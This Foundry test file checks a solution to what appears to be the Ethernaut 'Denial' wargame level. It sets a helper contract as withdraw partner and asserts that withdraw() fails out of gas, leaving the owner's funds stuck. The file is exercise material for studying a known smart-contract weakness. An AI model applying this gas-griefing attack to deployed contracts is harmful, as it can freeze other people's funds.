// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "./Solution.sol";
import "./Denial.sol";

contract test_solution is Test {
    Denial level;
    Solution solution;
    address player = makeAddr("player");

    function setUp() public {
        level = new Denial();
        solution = new Solution(address(level));
        vm.deal(player, 1 ether);
    }

    function test_denial() public {
        vm.startPrank(player);
        address(level).call{value: 0.001 ether}(""); // sending some eth to the contract
        level.setWithdrawPartner(address(solution));
        vm.expectRevert(bytes("")); // expects silent revert (OOG)
        address(level).call{gas: 1000000}("withdraw()"); // sending less than equal to 1M gas,
        assertEq(address(level).balance, 0.001 ether); // should have all the funds in the contract, owner unable to withdraw anything
        vm.stopPrank();
    }
}
